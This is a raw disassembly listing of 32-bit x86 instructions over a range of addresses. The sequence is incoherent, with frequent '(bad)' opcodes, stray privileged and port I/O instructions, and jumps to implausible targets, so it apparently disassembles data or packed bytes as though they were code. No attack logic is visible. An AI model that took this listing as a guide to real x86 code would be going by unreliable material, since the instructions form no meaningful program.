  4202cc:	fisttp QWORD PTR [edi]
  4202ce:	mov    esp,0xebd9435b
  4202d3:	mov    ds:0xd5cbaca9,eax
  4202d8:	dec    esi
  4202d9:	pop    esp
  4202da:	jne    0x4202d4
  4202dc:	mov    dl,0x24
  4202de:	dec    edi
  4202df:	and    edi,DWORD PTR [si]
  4202e2:	mov    ss,WORD PTR [ecx-0x67]
  4202e5:	push   edi
  4202e6:	lahf   
  4202e7:	mov    ebp,0x648652f2
  4202ec:	push   edi
  4202ed:	xchg   BYTE PTR [edx-0x6a],cl
  4202f0:	sub    BYTE PTR [esi+0x1864f146],cl
  4202f6:	cmp    BYTE PTR ds:0x76d077c6,dh
  4202fc:	test   eax,0x88cd7691
  420301:	sbb    dh,BYTE PTR ds:0x84681bcd
  420307:	mov    edx,0xe2178045
  42030c:	sbb    ecx,esp
  42030e:	clc    
  42030f:	in     al,0xf1
  420311:	xor    dh,ah
  420313:	(bad)  
  420314:	cli    
  420315:	jmp    0xc8078155
  42031a:	idiv   al
  42031c:	cmp    eax,0xaa4cca14
  420321:	jns    0x4202cb
  420323:	sub    eax,0x2f59cba2
  420328:	xchg   edx,eax
  420329:	xor    cl,BYTE PTR [esi]
  42032b:	xlat   BYTE PTR ds:[ebx]
  42032c:	gs cli 
  42032e:	(bad)  
  42032f:	push   edx
  420330:	dec    esp
  420331:	xor    eax,0x1da9f6ab
  420336:	push   ebp
  420337:	jmp    0x5bd7a151
  42033c:	jmp    0x27f:0x803fcc32
  420343:	and    eax,DWORD PTR es:[edi+0x3342cf18]
  42034a:	jmp    0x42031a
  42034c:	cld    
  42034d:	outs   dx,BYTE PTR ds:[esi]
  42034e:	or     BYTE PTR [ebp-0x4d314792],ch
  420354:	xchg   edi,eax
  420355:	mov    eax,ds:0x53ae9013
  42035a:	cld    
  42035b:	xchg   esi,eax
  42035c:	stc    
  42035d:	(bad)
  420360:	dec    ebx
  420361:	or     eax,ecx
  420363:	lock fcomp QWORD PTR [eax]
  420366:	imul   ebp,DWORD PTR [edi-0x443444c1],0xffffffd1
  42036d:	inc    edx
  42036e:	(bad)  
  42036f:	ins    BYTE PTR es:[edi],dx
  420370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420371:	xor    DWORD PTR [edi-0x38],ecx
  420374:	mov    al,ds:0x2d9debe8
  420379:	clc    
  42037a:	xchg   DWORD PTR [ebx+esi*8],esi
  42037d:	stos   DWORD PTR es:[edi],eax
  42037e:	out    dx,al
  42037f:	int    0xb9
  420381:	inc    edx
  420382:	and    BYTE PTR [edx+0x3f],ah
  420385:	and    DWORD PTR [ecx+0x3b],0xffffffdb
  420389:	ins    DWORD PTR es:[edi],dx
  42038a:	sub    ah,ch
  42038c:	mov    esi,0x2e380141
  420391:	stc    
  420392:	cmp    eax,0x45115412
  420397:	test   al,0xf5
  420399:	lahf   
  42039a:	xor    cl,cl
  42039c:	xor    al,0xbd
  42039e:	inc    BYTE PTR [eax-0x5c29558c]
  4203a4:	or     esp,DWORD PTR [eax+ecx*2-0x43b576e1]
  4203ab:	pop    edi
  4203ac:	xor    DWORD PTR [ebp-0x7350b765],eax
  4203b2:	lahf   
  4203b3:	pusha  
  4203b4:	jno    0x420433
  4203b6:	mov    bh,0xb
  4203b8:	aas    
  4203b9:	sub    DWORD PTR [edx-0x3a961909],edi
  4203bf:	pop    es
  4203c0:	xor    eax,0x4b4dae29
  4203c5:	sahf   
  4203c6:	pop    ss
  4203c7:	fwait
  4203c8:	daa    
  4203c9:	iret   
  4203ca:	loope  0x420395
  4203cc:	and    DWORD PTR [eax+0x60de6901],edx
  4203d2:	sub    BYTE PTR [edi-0x42],ch
  4203d5:	das    
  4203d6:	fiadd  DWORD PTR [edi+0x5f]
  4203d9:	push   es
  4203da:	aaa    
  4203db:	push   edx
  4203dc:	mov    ebx,0x1bf86c72
  4203e1:	cmp    eax,0xddf8e574
  4203e6:	pop    ebx
  4203e7:	add    esi,eax
  4203e9:	add    eax,0xab6cb12c
  4203ee:	sbb    al,al
  4203f0:	(bad)  
  4203f1:	popf   
  4203f2:	in     eax,0x75
  4203f4:	sub    DWORD PTR [edi-0x437410e0],0xa008a4a2
  4203fe:	sahf   
  4203ff:	sub    ch,cl
  420401:	neg    BYTE PTR [ebx]
  420403:	imul   esi,DWORD PTR [eax+edi*2],0xffffffcb
  420407:	sub    DWORD PTR [edi-0x8930f5],edi
  42040d:	fstp   st(5)
  42040f:	aas    
  420410:	jbe    0x42040d
  420412:	jns    0x42048c
  420414:	lock push ss
  420416:	shl    BYTE PTR [esi+0x729f9220],1
  42041c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42041d:	sbb    bh,dl
  42041f:	cli    
  420420:	dec    esi
  420421:	push   eax
  420422:	hlt    
  420423:	mov    edi,0xd4dbf8fd
  420428:	cld    
  420429:	int    0x24
  42042b:	sar    DWORD PTR [edx+0x71],1
  42042e:	cld    
  42042f:	daa    
  420430:	inc    ebp
  420431:	(bad)  
  420432:	pusha  
  420433:	dec    edi
  420434:	inc    edi
  420435:	dec    esp
  420436:	inc    esi
  420437:	mov    esp,0xf8188668
  42043c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42043d:	repz ficom DWORD PTR [ebp-0x721f6534]
  420444:	outs   dx,BYTE PTR ds:[esi]
  420445:	jmp    0xf32ccbf7
  42044a:	mov    dh,0x57
  42044c:	lea    edx,es:[edi+0x3574fda2]
  420453:	dec    edx
  420454:	les    edx,FWORD PTR [edx]
  420456:	ret    0x9ee
  420459:	sub    al,0x96
  42045b:	out    dx,al
  42045c:	loop   0x420412
  42045e:	aas    
  42045f:	add    al,0x8
  420461:	stc    
  420462:	xor    eax,ebx
  420464:	and    dh,al
  420466:	push   edx
  420467:	icebp  
  420468:	pop    ebx
  420469:	call   DWORD PTR fs:[esi+edi*4]
  42046d:	je     0x420471
  42046f:	inc    esp
  420470:	inc    edi
  420471:	add    BYTE PTR [eax+ebp*8+0x40537321],al
  420478:	push   es
  420479:	push   es
  42047a:	push   edx
  42047c:	sbb    DWORD PTR gs:[ebx+edx*2],eax
  420480:	lock rcr DWORD PTR [edi+edi*2],0x31
  420485:	jle    0x42041b
  420487:	dec    ebx
  420488:	add    al,0x16
  42048a:	ret    
  42048b:	fwait
  42048c:	sbb    eax,0xcf990df5
  420491:	cld    
  420492:	inc    eax
  420493:	jne    0x42048a
  420495:	(bad)  [eax+0x3e95d086]
  42049b:	loop   0x4204d1
  42049d:	clc    
  42049e:	mov    ch,0x14
  4204a0:	in     al,0x4a
  4204a2:	cwde   
  4204a3:	add    eax,0x897f7036
  4204a8:	daa    
  4204a9:	dec    ebp
  4204aa:	sbb    al,0xe1
  4204ac:	shr    BYTE PTR [ebp+ebx*4-0x27e77053],cl
  4204b3:	sbb    ah,BYTE PTR [ebp-0x7d]
  4204b6:	xchg   ebp,eax
  4204b7:	ret    
  4204b8:	mov    ecx,0xf9126b14
  4204bd:	div    DWORD PTR [ebp-0x16]
  4204c0:	ffreep st(2)
  4204c2:	out    0x8e,eax
  4204c4:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4204c6:	adc    DWORD PTR [ebx-0x17dd2ad],eax
  4204cc:	cli    
  4204cd:	lock lock call 0xed53:0xc7f7acd7
  4204d6:	jecxz  0x42051a
  4204d8:	add    DWORD PTR [eax-0x1ea8c0ce],ecx
  4204de:	rcr    ch,1
  4204e0:	xchg   ebp,eax
  4204e1:	scas   eax,DWORD PTR es:[edi]
  4204e2:	scas   eax,DWORD PTR es:[edi]
  4204e3:	arpl   WORD PTR [ebp-0x51],bx
  4204e6:	mov    WORD PTR [ebx+0x27],es
  4204e9:	cmp    BYTE PTR [edx-0x786be5ba],dl
  4204ef:	in     eax,0xa8
  4204f1:	call   0xd78e13
  4204f6:	cdq    
  4204f7:	push   es
  4204f8:	shl    DWORD PTR [esi+ebx*2],0xf9
  4204fc:	push   eax
  4204fd:	push   edi
  4204fe:	ins    BYTE PTR es:[edi],dx
  4204ff:	push   cs
  420500:	(bad)  
  420501:	sbb    ebx,DWORD PTR [ebx+0x40]
  420504:	cli    
  420505:	js     0x420583
  420507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420508:	dec    ecx
  420509:	pop    esp
  42050a:	not    DWORD PTR [edx-0x7106189]
  420510:	int    0x57
  420512:	jmp    0xbce0:0x3798c0b2
  420519:	sub    al,0xbc
  42051b:	add    al,0xd
  42051d:	mov    bl,0xcc
  42051f:	xor    BYTE PTR [edx-0x40],bl
  420522:	in     eax,dx
  420523:	dec    edx
  420524:	lock in al,dx
  420526:	(bad)  
  420528:	xchg   ebp,eax
  420529:	fadd   DWORD PTR [edx-0xc]
  42052c:	sbb    al,0x6f
  42052e:	mov    esp,0x3587f39d
  420533:	ss loope 0x42051f
  420536:	das    
  420537:	adc    eax,0xc4232ba
  42053c:	sub    al,0x8c
  42053e:	fs sahf 
  420540:	out    0x83,eax
  420542:	or     al,0x4e
  420544:	dec    edi
  420545:	cdq    
  420546:	lahf   
  420547:	mov    al,ds:0xc02346d6
  42054c:	sbb    ebx,eax
  42054e:	mov    esi,0x982dbacb
  420553:	pushf  
  420554:	inc    ebp
  420555:	xor    dh,BYTE PTR [edx]
  420557:	into   
  420558:	mov    ah,0xcb
  42055a:	pop    eax
  42055b:	(bad)  
  42055c:	and    bl,al
  42055e:	mov    al,ds:0x2c347bd4
  420563:	ss mov ebx,0x42016c10
  420569:	sahf   
  42056a:	imul   eax,DWORD PTR [eax],0xffffffdc
  42056d:	hlt    
  42056e:	jl     0x420584
  420570:	call   0xb64f2a2
  420575:	sahf   
  420576:	adc    ebp,ecx
  420578:	ins    BYTE PTR es:[edi],dx
  420579:	ret    0xcf56
  42057c:	dec    ebp
  42057d:	pop    es
  42057e:	mov    ds:0x7dd2bd8e,al
  420583:	pusha  
  420584:	ret    
  420585:	xor    cl,dl
  420587:	shl    DWORD PTR [ecx],1
  420589:	jne    0x42054c
  42058b:	push   ebx
  42058c:	lahf   
  42058d:	jp     0x420581
  42058f:	xchg   ebp,eax
  420590:	mov    ebx,0x2166c848
  420595:	inc    eax
  420596:	jno    0x420536
  420598:	pop    esi
  420599:	enter  0xf18a,0x3a
  42059d:	js     0x42055f
  42059f:	push   ebx
  4205a0:	lods   al,BYTE PTR ds:[esi]
  4205a1:	sbb    eax,0x39a46be2
  4205a6:	fld    QWORD PTR [ebx-0x26]
  4205a9:	(bad)  
  4205aa:	or     DWORD PTR [eax],edx
  4205ac:	std    
  4205ad:	cmp    ecx,DWORD PTR [ecx-0x5]
  4205b0:	dec    ebp
  4205b1:	(bad)  
  4205b2:	cmp    ebx,DWORD PTR [edi]
  4205b4:	sbb    BYTE PTR [esi],0x4
  4205b7:	jae    0x4205e3
  4205b9:	dec    eax
  4205ba:	call   0xd307c826
  4205bf:	inc    esp
  4205c0:	cmp    eax,0x69f5ebad
  4205c5:	fimul  WORD PTR [eax+0x5f]
  4205c8:	xchg   esp,eax
  4205c9:	mov    ds:0x86cfd2d4,al
  4205ce:	in     eax,0x53
  4205d0:	mov    al,ds:0x3ecd453c
  4205d5:	mov    ah,0x43
  4205d7:	mov    WORD PTR [ebx+0x46371c50],ds
  4205dd:	mov    esi,DWORD PTR [ecx+0x438f2aa1]
  4205e3:	gs mov esi,0x758478f5
  4205e9:	sub    DWORD PTR [edi],eax
  4205eb:	rcl    DWORD PTR [esp+esi*8],0xc1
  4205ef:	fldlg2 
  4205f1:	retf   
  4205f2:	jmp    0x5111:0x1a2e4ac3
  4205f9:	jmp    0x420592
  4205fb:	or     dl,0x92
  4205fe:	mov    ecx,0x22ea524
  420603:	rep stos BYTE PTR es:[edi],al
  420605:	mov    cl,0xe6
  420607:	(bad)  
  420608:	je     0x42067a
  42060a:	mov    al,0x96
  42060c:	mov    dh,0x4f
  42060e:	xchg   BYTE PTR [edi+0x70f15599],bh
  420614:	popf   
  420615:	jae    0x4205a1
  420617:	rcl    DWORD PTR ds:0xc6566045,cl
  42061d:	jle    0x42061e
  42061f:	dec    ebp
  420620:	cwde   
  420621:	mov    dl,0x7e
  420623:	jae    0x42068f
  420625:	mov    eax,ds:0x358ecb72
  42062a:	and    al,BYTE PTR [ebx]
  42062c:	lds    edi,FWORD PTR [edx+0x32]
  42062f:	rcr    BYTE PTR [edi],0x94
  420632:	mov    edi,0x42a49036
  420637:	outs   dx,BYTE PTR ds:[esi]
  420638:	xchg   edi,eax
  420639:	arpl   WORD PTR [esi+ebp*4+0x6acc935b],bp
  420640:	add    BYTE PTR [esi+0x5f],cl
  420643:	bound  eax,QWORD PTR [eax]
  420645:	cli    
  420646:	std    
  420647:	xor    al,0x47
  42064a:	xor    BYTE PTR [eax],bh
  42064c:	imul   eax,DWORD PTR [eax+0x127e0d64],0x38
  420653:	xchg   esp,esi
  420655:	in     al,0xbe
  420657:	mov    ds:0x34b30c29,eax
  42065c:	adc    DWORD PTR [ebp+0x49081734],edi
  420662:	inc    ebp
  420663:	jle    0x42068a
  420665:	mov    al,0x7a
  420667:	cli    
  420668:	xchg   edx,eax
  420669:	out    dx,al
  42066a:	xchg   edi,eax
  42066b:	push   0x6
  42066d:	push   edi
  42066e:	loope  0x42063a
  420670:	push   edi
  420671:	inc    edx
  420672:	rcl    BYTE PTR [ecx],cl
  420674:	ins    DWORD PTR es:[edi],dx
  420675:	rcr    DWORD PTR [ecx+0x19b00dfd],0x95
  42067c:	adc    eax,0x3e6c788c
  420681:	aam    0x42
  420683:	xor    esi,DWORD PTR [ebp+0x6]
  420686:	shl    DWORD PTR [edi],0x21
  420689:	inc    eax
  42068a:	aam    0x7e
  42068c:	sub    eax,0xfe412406
  420691:	xchg   ebx,eax
  420692:	adc    esp,DWORD PTR ds:0xbfe5f537
  420698:	adc    DWORD PTR [ebp-0x396642bf],0x4b
  42069f:	(bad)  
  4206a0:	rol    DWORD PTR [edi-0x4c2db0a],1
  4206a6:	xchg   esp,eax
  4206a7:	mov    ?,esp
  4206a9:	fmul   st,st(1)
  4206ab:	mov    bh,0x9c
  4206ad:	sub    al,0xe2
  4206af:	clc    
  4206b0:	test   BYTE PTR [esi-0x5ebc946b],ah
  4206b6:	test   BYTE PTR [ebp+edx*2-0x24cea18d],dh
  4206bd:	jecxz  0x4206c6
  4206bf:	xchg   ecx,eax
  4206c0:	pop    ss
  4206c1:	sti    
  4206c2:	hlt    
  4206c3:	icebp  
  4206c4:	leave  
  4206c5:	mov    esp,0xf7515710
  4206ca:	and    esi,DWORD PTR [esi+0x523294ca]
  4206d0:	in     al,dx
  4206d1:	fisubr WORD PTR [eax]
  4206d3:	push   ds
  4206d4:	mov    fs,esi
  4206d6:	xchg   DWORD PTR [ebp-0x1b],edx
  4206d9:	into   
  4206da:	(bad)  
  4206db:	push   0x54
  4206dd:	dec    edi
  4206de:	ins    BYTE PTR es:[edi],dx
  4206df:	or     al,ch
  4206e1:	(bad)  
  4206e2:	ss enter 0xd773,0x4f
  4206e7:	sub    BYTE PTR [esi-0x61dea947],dl
  4206ed:	repnz push ecx
  4206ef:	sbb    DWORD PTR ss:[esi-0x65],0xe
  4206f4:	push   edx
  4206f5:	dec    ecx
  4206f6:	outs   dx,DWORD PTR ds:[esi]
  4206f7:	pop    esp
  4206f8:	adc    al,0xde
  4206fa:	test   BYTE PTR [ebp+0x68805fa4],ah
  420700:	dec    ecx
  420701:	jge    0x420690
  420703:	out    dx,eax
  420704:	ret    0x34c6
  420707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420708:	sub    BYTE PTR [edi+0x3cd36c4d],ch
  42070e:	lock xchg edx,eax
  420710:	ss pop ds
  420712:	dec    esi
  420713:	push   edx
  420714:	jo     0x420732
  420716:	add    ebp,DWORD PTR [edi]
  420718:	or     al,ch
  42071a:	or     dl,BYTE PTR [ebp+ebp*1-0x3e]
  42071e:	mov    bl,BYTE PTR [edx]
  420720:	mov    cl,0x7d
  420722:	cli    
  420723:	aaa    
  420724:	loop   0x4206e7
  420726:	test   BYTE PTR [ecx-0x35],al
  420729:	sar    DWORD PTR [edi],1
  42072b:	loope  0x420723
  42072d:	mov    bh,0xd1
  42072f:	push   ecx
  420730:	ins    BYTE PTR es:[edi],dx
  420731:	mov    eax,0x29636fca
  420736:	push   ebp
  420737:	loop   0x4206d2
  420739:	das    
  42073a:	mov    ds:0x2c530761,al
  42073f:	or     BYTE PTR [ecx+0x4ac1e0e6],0x96
  420746:	mov    bl,0x44
  420748:	xor    DWORD PTR [ebx+ebx*1-0x6ed5a5dd],edx
  42074f:	dec    eax
  420750:	icebp  
  420751:	fmul   st,st(7)
  420753:	or     ch,BYTE PTR [edx+0x46]
  420756:	and    BYTE PTR [ecx+0x6710282d],cl
  42075c:	(bad)  
  42075d:	cmc    
  42075e:	jo     0x42070a
  420760:	sbb    eax,0xa9f3acd3
  420765:	fld    TBYTE PTR [edx+eax*4]
  420768:	test   DWORD PTR [ebx-0x45],edi
  42076b:	shr    al,cl
  42076d:	es dec ebp
  42076f:	inc    esi
  420770:	je     0x42071a
  420772:	and    ch,dh
  420774:	ins    DWORD PTR es:[edi],dx
  420775:	mov    ebx,0xbe0216ee
  42077a:	xchg   ebp,eax
  42077b:	lods   eax,DWORD PTR ds:[esi]
  42077c:	adc    DWORD PTR [edx],ebx
  42077e:	clc    
  42077f:	dec    edi
  420780:	(bad)  
  420781:	in     al,dx
  420782:	nop
  420783:	mov    ebp,eax
  420785:	out    0x96,al
  420787:	adc    ah,BYTE PTR [eax]
  420789:	lahf   
  42078a:	push   ds
  42078b:	inc    eax
  42078c:	cmp    eax,0x75b9c5b6
  420791:	mov    al,0x6a
  420793:	sbb    BYTE PTR [bx+0x73d9],dh
  420798:	xchg   ebp,eax
  420799:	sbb    al,0xdf
  42079b:	cld    
  42079c:	push   0x3a8bdd65
  4207a1:	sub    ah,al
  4207a3:	int    0x9c
  4207a5:	out    0x3f,al
  4207a7:	push   0xd3518b7b
  4207ac:	and    eax,0x8331ef58
  4207b1:	xchg   sp,ax
  4207b3:	ins    BYTE PTR es:[edi],dx
  4207b4:	scas   eax,DWORD PTR es:[edi]
  4207b5:	iret   
  4207b6:	jae    0x420816
  4207b8:	pop    eax
  4207b9:	test   ebx,edi
  4207bb:	pop    ebx
  4207bc:	pop    ebx
  4207bd:	or     bl,BYTE PTR [esp+esi*8-0x30]
  4207c1:	push   eax
  4207c2:	fistp  WORD PTR [edi+0x7d642b0a]
  4207c8:	or     edx,DWORD PTR [edi]
  4207ca:	shl    ebx,cl
  4207cc:	mov    ?,WORD PTR [edx]
  4207ce:	test   DWORD PTR [edx+0x5ec87fed],edx
  4207d4:	(bad)
  4207d8:	xor    ecx,ecx
  4207da:	jl     0x420774
  4207dc:	call   0x7fc3:0x4fb2445
  4207e3:	or     eax,0xbb4e54ea
  4207e8:	sub    dh,BYTE PTR [eax+edi*1+0x5c41dc6a]
  4207ef:	dec    edi
  4207f0:	cmp    al,0x4c
  4207f2:	clc    
  4207f3:	in     al,0x54
  4207f5:	aam    0x91
  4207f7:	stc    
  4207f8:	add    DWORD PTR [ebx-0x44],esi
  4207fb:	adc    al,0x35
  4207fd:	cmp    bh,ch
  4207ff:	jne    0x4207c8
  420801:	lea    ecx,[esi]
  420803:	inc    edi
  420804:	cli    
  420805:	hlt    
  420806:	retf   0x50bf
  420809:	inc    esp
  42080a:	jg     0x420862
  42080c:	fst    QWORD PTR [eax]
  42080e:	ds xor eax,0xb6bf3a60
  420814:	cli    
  420815:	cwde   
  420816:	adc    BYTE PTR [esi-0x6b990342],cl
  42081c:	stc    
  42081d:	loope  0x4207e7
  42081f:	outs   dx,BYTE PTR ds:[esi]
  420820:	cmp    eax,0x63625b13
  420825:	test   al,0xba
  420827:	pop    edx
  420828:	imul   eax,DWORD PTR [edi],0xa499fe47
  42082e:	push   ss
  42082f:	xor    eax,0x9e3ee616
  420834:	idiv   DWORD PTR [ebp+0x8]
  420837:	adc    eax,0x70b138db
  42083c:	cld    
  42083d:	cmp    DWORD PTR [esi],0x437777b9
  420843:	(bad)  
  420844:	pop    ss
  420845:	cmp    al,al
  420847:	adc    DWORD PTR [esi-0x3],eax
  42084a:	test   DWORD PTR [ebx-0x51],edi
  42084d:	scas   eax,DWORD PTR es:[edi]
  42084e:	push   es
  42084f:	(bad)  
  420850:	cli    
  420851:	ss push ss
  420853:	cld    
  420854:	ds loope 0x420832
  420857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420858:	xchg   ebp,eax
  420859:	add    eax,0x7fcb541e
  42085e:	rcr    DWORD PTR [edi-0x20a1ede8],1
  420864:	jbe    0x4208aa
  420866:	call   0x59fd9c40
  42086b:	inc    esi
  42086c:	jns    0x420807
  42086e:	imul   ecx,DWORD PTR [ebp+0x7a],0x6e6dd6ee
  420875:	adc    eax,0x355c66ee
  42087a:	fs dec ecx
  42087c:	fwait
  42087d:	je     0x420845
  42087f:	mov    ds:0x45e481c9,eax
  420884:	loope  0x4208f7
  420886:	cmp    bl,BYTE PTR [ebp+0x13]
  420889:	xor    DWORD PTR [esi],0x43
  42088c:	mov    dl,0x36
  42088e:	js     0x42088c
  420890:	fdiv   QWORD PTR [edx-0x1b]
  420893:	pop    edx
  420894:	mov    edx,0x4e6487ca
  420899:	dec    eax
  42089a:	fisub  WORD PTR [eax]
  42089c:	xchg   ebp,eax
  42089d:	repnz or edi,DWORD PTR [edx+0x5b]
  4208a1:	xor    BYTE PTR [eax],cl
  4208a3:	jecxz  0x420867
  4208a5:	sahf   
  4208a6:	mov    al,0xaf
  4208a8:	int3   
  4208a9:	jmp    0x9e9c5f38
  4208ae:	shl    DWORD PTR ds:0x4a4226ef,0x4d
  4208b5:	dec    edi
  4208b6:	sbb    BYTE PTR [ecx-0x34],dl
  4208b9:	int3   
  4208ba:	leave  
  4208bb:	nop
  4208bc:	daa    
  4208bd:	pop    eax
  4208be:	sbb    ch,BYTE PTR gs:[ecx+0xfa10067]
  4208c5:	js     0x420892
  4208c7:	icebp  
  4208c8:	jecxz  0x4208d5
  4208ca:	dec    ecx
  4208cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208cc:	jne    0x420865
  4208ce:	xchg   BYTE PTR [esi+0x68],dl
  4208d1:	push   es
  4208d2:	fsub   st,st(7)
  4208d4:	imul   esp,DWORD PTR [edi+0x12],0xefd961b3
  4208db:	lods   al,BYTE PTR ds:[esi]
  4208dc:	in     al,0x99
  4208de:	fmul   DWORD PTR [esi-0x369851bd]
  4208e4:	out    dx,al
  4208e5:	xor    esp,DWORD PTR [edx]
  4208e7:	jo     0x420871
  4208e9:	sbb    bl,dh
  4208eb:	jmp    0xfe973dba
  4208f0:	xlat   BYTE PTR ds:[ebx]
  4208f1:	ret    0x9c42
  4208f4:	inc    DWORD PTR [eax+0x23]
  4208f7:	jg     0x4208cf
  4208f9:	ja     0x42087c
  4208fb:	inc    esi
  4208fc:	cmp    ah,BYTE PTR [edi-0x10850493]
  420902:	mov    esi,0xa22e9307
  420907:	inc    ebx
  420908:	push   eax
  420909:	cld    
  42090a:	(bad)  
  42090b:	iret   
  42090c:	fsubr  QWORD PTR ds:0x6f340c5f
  420912:	clc    
  420913:	in     eax,dx
  420914:	sub    dh,BYTE PTR [eax+0x6cb81ef9]
  42091a:	jmp    0x42096d
  42091c:	pop    ecx
  42091d:	scas   al,BYTE PTR es:[edi]
  42091e:	mov    bh,0x53
  420920:	add    bl,BYTE PTR [edx-0x47fbc1c2]
  420926:	enter  0xb6a0,0xd3
  42092a:	repz fmul DWORD PTR [esi+ecx*1-0x5e587f2e]
  420932:	sub    DWORD PTR [ecx+0xf0a4c15],0xa6931056
  42093c:	pop    esp
  42093d:	or     DWORD PTR [edi],ebp
  42093f:	retf   
  420940:	jmp    0x420941
  420942:	mov    bl,0x6c
  420944:	add    ah,0x13
  420947:	or     ebx,esi
  420949:	popf   
  42094a:	pop    esp
  42094b:	sbb    DWORD PTR [ecx-0x22],ebp
  42094e:	jl     0x4208fe
  420950:	shl    BYTE PTR ds:0x25340c8,1
  420956:	dec    esp
  420957:	xlat   BYTE PTR ds:[ebx]
  420958:	xchg   BYTE PTR [ecx],dl
  42095a:	rep lods al,BYTE PTR ds:[esi]
  42095c:	mov    bh,0xe
  42095e:	popf   
  42095f:	orps   xmm7,XMMWORD PTR [esi-0x4ebacb80]
  420966:	cmp    esi,0xffffffb6
  420969:	retf   0xe851
  42096c:	xchg   esp,eax
  42096d:	(bad)
  420970:	mov    WORD PTR [ebp+0x18],cs
  420973:	push   es
  420974:	add    bl,BYTE PTR [ebp-0x77153bfc]
  42097a:	fwait
  42097b:	mov    esp,0xaa5fb4bf
  420980:	cmp    edi,DWORD PTR [edx-0x64]
  420983:	cmp    eax,0x9b83385
  420988:	add    ah,BYTE PTR [edi-0x68]
  42098b:	dec    esp
  42098c:	(bad)  
  42098d:	dec    esp
  42098e:	fld    DWORD PTR [ebp+0x7a]
  420991:	jg     0x4209c5
  420993:	and    al,0xa0
  420995:	jno    0x4209ea
  420997:	mov    ebx,0xafa9130b
  42099c:	(bad)  
  42099d:	push   edx
  42099e:	sbb    bl,cl
  4209a0:	lea    esi,[edx]
  4209a2:	out    dx,eax
  4209a3:	outs   dx,BYTE PTR ds:[esi]
  4209a4:	jno    0x42094f
  4209a6:	sbb    DWORD PTR [ecx+0x548024d7],ebp
  4209ac:	into   
  4209ad:	jp     0x4209be
  4209af:	ror    DWORD PTR [eax+0x1a22f4e3],cl
  4209b5:	nop
  4209b6:	repnz mov esi,0x245d873e
  4209bc:	sub    al,dl
  4209be:	test   DWORD PTR [edx+0x680a5e37],esi
  4209c4:	cmp    DWORD PTR [eax+0xe],edx
  4209c7:	enter  0xa9b8,0xa1
  4209cb:	mov    al,ds:0xb66d457c
  4209d0:	sahf   
  4209d1:	dec    ecx
  4209d2:	scas   al,BYTE PTR es:[edi]
  4209d3:	dec    eax
  4209d4:	(bad)  
  4209d5:	cdq    
  4209d6:	jle    0x420988
  4209d8:	mov    ah,0x16
  4209da:	cmp    eax,0xe7533237
  4209df:	xor    bl,BYTE PTR [ebp-0x4d]
  4209e2:	pop    edx
  4209e3:	push   ss
  4209e4:	cdq    
  4209e5:	imul   ecx,esi,0x6ef041ca
  4209eb:	lods   eax,DWORD PTR ds:[esi]
  4209ec:	inc    esi
  4209ed:	(bad)  
  4209ee:	mov    edx,0x768e1871
  4209f3:	jle    0x4209fb
  4209f5:	mov    eax,0x658b4a51
  4209fa:	mov    ebx,0x33b07859
  4209ff:	int3   
  420a00:	cwde   
  420a01:	jb     0x420a74
  420a03:	dec    esp
  420a04:	ss aaa 
  420a06:	mov    WORD PTR [ecx-0x1c],?
  420a09:	inc    ebp
  420a0a:	dec    esi
  420a0b:	in     al,0x7a
  420a0d:	fisubr DWORD PTR [ebx+0x1f]
  420a10:	into   
  420a11:	(bad)  
  420a13:	adc    DWORD PTR ds:[edx-0x7315838d],ecx
  420a1a:	jmp    0x4209b7
  420a1c:	jle    0x420a9c
  420a1e:	pop    esp
  420a1f:	sub    cl,BYTE PTR [edi+0xbc354af]
  420a25:	jecxz  0x420a05
  420a27:	jmp    0x420a35
  420a29:	retf   0xad35
  420a2c:	imul   ecx,DWORD PTR [edx],0xfffffff7
  420a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a30:	add    dh,0xaa
  420a33:	mulps  xmm0,XMMWORD PTR [edx+0x4af26d32]
  420a3a:	popa   
  420a3b:	pop    ebp
  420a3c:	dec    esp
  420a3d:	scas   al,BYTE PTR es:[edi]
  420a3e:	rcr    BYTE PTR [esi],1
  420a40:	sbb    al,0xf6
  420a42:	add    eax,0x7509c9bc
  420a47:	out    0xb9,eax
  420a49:	pusha  
  420a4a:	test   ebp,esi
  420a4c:	(bad)  
  420a4d:	icebp  
  420a4e:	mov    cl,0xb
  420a50:	mov    ecx,0x73b4213d
  420a55:	mov    ah,0x95
  420a57:	(bad)  [edi+0x5dc1a317]
  420a5d:	pop    edi
  420a5e:	stc    
  420a5f:	aaa    
  420a60:	cmp    BYTE PTR fs:[ebp+edx*2+0x5],bh
  420a65:	and    ch,BYTE PTR [edi-0x1a36a653]
  420a6b:	sub    al,BYTE PTR [edi]
  420a6d:	fst    DWORD PTR [edi+0x51]
  420a70:	ins    DWORD PTR es:[edi],dx
  420a71:	or     eax,0x5b14d44c
  420a76:	adc    al,0xdb
  420a78:	sub    DWORD PTR [ecx],edx
  420a7a:	outs   dx,BYTE PTR ds:[esi]
  420a7b:	push   0x122b681
  420a80:	scas   eax,DWORD PTR es:[edi]
  420a81:	pop    edi
  420a82:	sbb    edi,DWORD PTR ds:0xc950d1
  420a88:	and    DWORD PTR es:[ebp-0x4d2a9119],0x41e21e7f
  420a93:	out    dx,eax
  420a94:	jmp    0x420ae1
  420a96:	ss jo  0x420aa2
  420a99:	xchg   esi,eax
  420a9a:	iret   
  420a9b:	or     al,0x3a
  420a9d:	mov    eax,ds:0xcf594e93
  420aa2:	sub    cl,ah
  420aa4:	cmp    ch,BYTE PTR [edx+0x37f748a0]
  420aaa:	scas   al,BYTE PTR es:[edi]
  420aab:	daa    
  420aac:	sbb    DWORD PTR [edx+0x262f7d52],ebx
  420ab2:	xor    cl,BYTE PTR [edi-0x3e]
  420ab5:	inc    esi
  420ab6:	repnz icebp 
  420ab8:	push   0x570e435e
  420abd:	cs dec eax
  420abf:	out    dx,al
  420ac0:	ins    DWORD PTR es:[edi],dx
  420ac1:	sbb    BYTE PTR [esi+ecx*4],0x13
  420ac5:	es in  al,0x48
  420ac8:	les    edi,FWORD PTR [esi+0x10]
  420acb:	scas   al,BYTE PTR es:[edi]
  420acc:	jmp    FWORD PTR ds:0xcb17b74b
